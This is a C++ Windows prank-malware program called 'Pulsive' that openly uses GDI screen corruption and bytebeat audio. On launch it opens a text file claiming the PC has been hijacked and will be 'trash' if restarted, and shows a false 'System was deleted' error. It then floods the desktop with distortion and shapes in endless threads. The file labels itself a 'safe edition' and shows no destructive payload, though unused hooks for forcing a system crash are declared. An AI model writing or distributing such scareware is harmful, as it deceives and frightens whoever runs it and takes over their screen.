#include <windows.h>
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "winmm.lib")
#include <cmath>
#include <iostream>
#include <fstream>
#include <stdlib.h>
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI GDI1(LPCVOID lpparam) {
	SetProcessDPIAware();
	while (true) {
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI GDI2(LPCVOID lpparam) {
	SetProcessDPIAware();
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI GDI4(LPCVOID lplaram) {
	SetProcessDPIAware();
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), rx = rand() % w;
	int x = 10;
	int y = 10;
	int ic = 10;
	int SX = 1;
	int SY = 1;
	int SX2 = 1;
	int SY2 = 1;
	while (true) {
		x += ic * SX;
		y += ic * SY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		Ellipse(hdc, top_x, top_y, bottom_x + rand() % 100, bottom_y + rand() % 100);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			SY = -10;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			SX = -1;
		}

		if (y == 0)
		{
			SY = 1 + rand() % 10;
		}

		if (x == 0)
		{
			SX = 1;
		}
		Sleep(20);
	}
}


DWORD WINAPI GDI3(LPCVOID lpparam) {
	SetProcessDPIAware();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int SX = 1;
	int SY = 1;
	int SX1 = 1;
	int SY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * SX;
		y += incrementor * SY;
		HBRUSH brush = CreateSolidBrush(200);
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		Ellipse(hdc, top_x + 92, top_y + 92, bottom_x - 100, bottom_y - 100);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			SY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			SX = -1;
		}

		if (y == 0)
		{
			SY = rand() % 5;
		}

		if (x == 0)
		{
			SX = rand() % 5;
		}
		Sleep(50);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI GDI5(LPVOID lpparam) {//BY pankoza
	SetProcessDPIAware();
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, 4 * h * w, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 10)
			byte = randy() % 0xff;
		for (int i = 0; w * h > i; ++i) {
			if (!(i % h) && !(randy() % 110))
				v = randy() % 24;
			*((BYTE*)data + 4 * i + v) -= 5;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI GDI6(LPVOID lpparam) {
	SetProcessDPIAware();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int SX = 1;
	int SY = 1;
	int SX1 = 1;
	int SY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * SX;
		y += incrementor * SY;
		HBRUSH brush = CreateSolidBrush(200);
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			SY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			SX = -1;
		}

		if (y == 0)
		{
			SY = rand() % 5;
		}

		if (x == 0)
		{
			SX = rand() % 5;
		}
		Sleep(50);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

using namespace std;
DWORD WINAPI notepad() {
	std::ofstream outfile("Pulsive made by ptr35(KT).txt");
	outfile << "Your PC has been hijacked by pulsive.\nDo not try restart pc or shutdown.\nIf you trying this, your pc will be trash.\n(This is safe edition LOL!)" << std::endl;
	outfile.close();
	system("notepad c:\Pulsive made by ptr35(KT).txt");
	return 0;
}

DWORD WINAPI TEST2(LPVOID lpparam) {
	MessageBox(NULL, TEXT("System was deleted."), TEXT("ERROR"), MB_OK | MB_ICONERROR);
	return 0;
}

VOID WINAPI S1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 10] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6) + (t >> 6) * (t >> 4) >> (16 << t & t >> 2) & 200;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI S2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 2 | t >> 10) | (t >> 6) * (t >> 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI S3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6) + (t >> 6) * (t >> (t << 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI S4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 2 ^ t >> 7) ^ (t >> 2 | t >> 7) * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int main()
{
	HANDLE ntpd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)notepad, 0, 0, 0);
	HANDLE msg = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TEST2, 0, 0, 0);
	Sleep(3000);
	HANDLE GDIscreen1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI1, 0, 0, 0);
	S1();
	Sleep(10000);
	TerminateThread(GDIscreen1, 0);
	CloseHandle(GDIscreen1);
	InvalidateRect(0, 0, 0);
	S2();
	HANDLE GDIscreen2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI2, 0, 0, 0);
	HANDLE GDIscreen3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI3, 0, 0, 0);
	HANDLE GDIscreen4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI4, 0, 0, 0);
	HANDLE GDIscreen5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI5, 0, 0, 0);
	HANDLE GDIscreen6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI6, 0, 0, 0);
	Sleep(30000);
	S3();
	Sleep(30000);
	S4();
	Sleep(INFINITE);
}